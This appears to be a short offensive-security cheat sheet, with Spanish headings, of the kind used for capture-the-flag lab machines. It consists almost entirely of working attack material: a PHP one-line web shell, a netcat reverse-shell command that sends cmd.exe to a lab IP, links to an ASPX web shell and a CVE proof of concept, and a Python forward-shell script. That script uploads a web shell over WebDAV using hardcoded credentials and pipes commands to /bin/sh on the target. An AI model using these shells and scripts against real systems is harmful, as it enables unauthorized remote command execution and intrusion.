
```bash
<?php system($_REQUEST['cmd']); ?>
```

- Windows
```bash
nc64.exe -e cmd.exe 10.10.14.6 443
```

- ASPX
```bash
https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/asp/cmd.aspx
```

## Subida de UN ZIP

```bash
#SI ES WINDOWS
https://github.com/0x6rss/CVE-2025-24071_PoC
```


## Forward shell

```python
#!/usr/bin/env python3

import random
import requests
import sys
from cmd import Cmd


class Term(Cmd):

    prompt = "Inception> "

    def __init__(self):
        super().__init__()
        self.url_base = "http://10.10.10.67/webdav_test_inception/"
        self.id = random.randrange(10000, 99999)
        self.url = f"{self.url_base}0xdf-{self.id}.php"
        self.auth = ("webdav_tester", "babygurl69")
        self.input = f"/dev/shm/stdin.{self.id}"
        self.output = f"/dev/shm/stdout.{self.id}"
        print(f"Starting forward shell with session {self.id}")

        # upload webshell
        requests.put(self.url, auth=self.auth, data="<?php system($_REQUEST['cmd']); ?>")
        resp = requests.post(self.url, data={"cmd": "id"}, auth=self.auth)
        assert "uid=33(www-data) gid=33(www-data) groups=33(www-data)" in resp.text
        print(f"Webshell uploaded to {self.url}")

        # init forward shell
        self.raw_command(f"mkfifo {self.input}")
        self.raw_command(f"tail -f {self.input} | /bin/sh 2>&1 > {self.output}", timeout=0.5)
        print("Forward shell initiated")


    def raw_command(self, command, timeout=None):
        try:
            resp = requests.post(self.url, data={"cmd": command}, auth=self.auth, timeout=timeout)
        except requests.exceptions.ReadTimeout:
            return None
        return resp.text


    def command(self, command, timeout=None):
        self.raw_command(f"echo {command} > {self.input}")
        resp = self.raw_command(f"cat {self.output}; echo -n > {self.output}")
        return resp


    def default(self, args):
        print(self.command(args), end="")


    def do_upgrade(self, args):
        print(self.command("script /dev/null -c bash"), end="")
        print(self.command("stty raw -echo"), end="")
        self.prompt = ""


term = Term()
try:
    sys.exit(term.cmdloop())
except KeyboardInterrupt:
    print()

```
